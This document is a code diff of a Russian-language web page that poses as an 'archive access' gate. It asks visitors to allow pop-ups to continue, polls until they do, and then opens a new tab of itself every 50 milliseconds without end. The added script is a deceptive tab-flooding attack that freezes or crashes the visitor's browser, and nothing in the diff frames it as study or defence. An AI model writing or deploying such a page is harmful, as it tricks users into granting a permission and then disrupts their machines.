@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Tuzyaka archive</title>
+    <title>Доступ к архиву</title>
     <style>
         body {
             background-color: #000;
@@ -11,7 +11,6 @@
             text-align: center;
             padding-top: 40%;
             margin: 0;
-            overflow: hidden;
         }
         h1 {
             font-size: 2em;
@@ -25,18 +24,36 @@
     </style>
 </head>
 <body>
-    <h1>Tuzyaka archive</h1>
-    <p>Дайте доступ к архиву, разрешив всплывающие окна</p>
+    <h1>Доступ к архиву</h1>
+    <p>Разрешите всплывающие окна, чтобы продолжить</p>
 
     <script>
-        // Бесконечные попытки открытия новых вкладок
-        function tryOpenTab() {
-            window.open(window.location.href, '_blank');
-            setTimeout(tryOpenTab, 50); // Пытаемся открывать каждые 50 мс
+        let permissionGranted = false;
+
+        // Функция проверки разрешения на всплывающие окна
+        function checkPermission() {
+            const testWindow = window.open('', '_blank');
+            if (testWindow) {
+                testWindow.close(); // Закрываем тестовое окно
+                permissionGranted = true;
+                startSpam(); // Запускаем спам вкладок
+            } else {
+                // Если разрешение не дано, проверяем снова через 1 секунду
+                setTimeout(checkPermission, 1000);
+            }
         }
 
-        // Запуск при загрузке страницы
-        tryOpenTab();
+        // Функция бесконечного открытия вкладок
+        function startSpam() {
+            function openTab() {
+                window.open(window.location.href, '_blank');
+                setTimeout(openTab, 50); // Открываем новую вкладку каждые 50 мс
+            }
+            openTab();
+        }
+
+        // Начинаем проверку разрешения
+        checkPermission();
     </script>
 </body>
 </html>
